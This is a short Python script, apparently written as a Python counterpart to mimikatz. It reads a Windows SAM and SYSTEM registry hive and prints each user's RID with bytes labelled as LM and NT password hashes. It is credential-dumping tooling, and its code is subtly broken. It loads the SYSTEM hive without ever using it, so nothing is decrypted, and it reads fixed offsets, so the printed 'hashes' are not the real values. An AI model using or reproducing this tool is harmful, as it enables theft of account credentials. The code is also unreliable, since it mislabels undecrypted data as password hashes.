import sys
from Registry import Registry


def get_user_hashes(user_key):
    V = user_key.value("V").value()
    rid = int(user_key.name().split(' ')[-1], 16)
    F = V[0x00:0x10]
    LMHash = V[0x18:0x28]
    NTHash = V[0x30:0x40]

    return rid, F, LMHash, NTHash


def main(sam_file, system_file):
    sam = Registry.Registry(sam_file)
    system = Registry.Registry(system_file)

    sam_account_path = "SAM\\Domains\\Account"
    sam_account_key = sam.open(sam_account_path)

    users_key = sam_account_key.subkey("Users")

    for user_key in users_key.subkeys():
        if user_key.name() != "Names":
            rid, F, LMHash, NTHash = get_user_hashes(user_key)
            print(f"RID: {rid}\nF: {F.hex()}\nLMHash: {LMHash.hex()}\nNTHash: {NTHash.hex()}\n")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python mimikatz_python.py <path_to_sam_hive> <path_to_system_hive>")
        sys.exit(1)

    sam_file = sys.argv[1]
    system_file = sys.argv[2]
    main(sam_file, system_file)
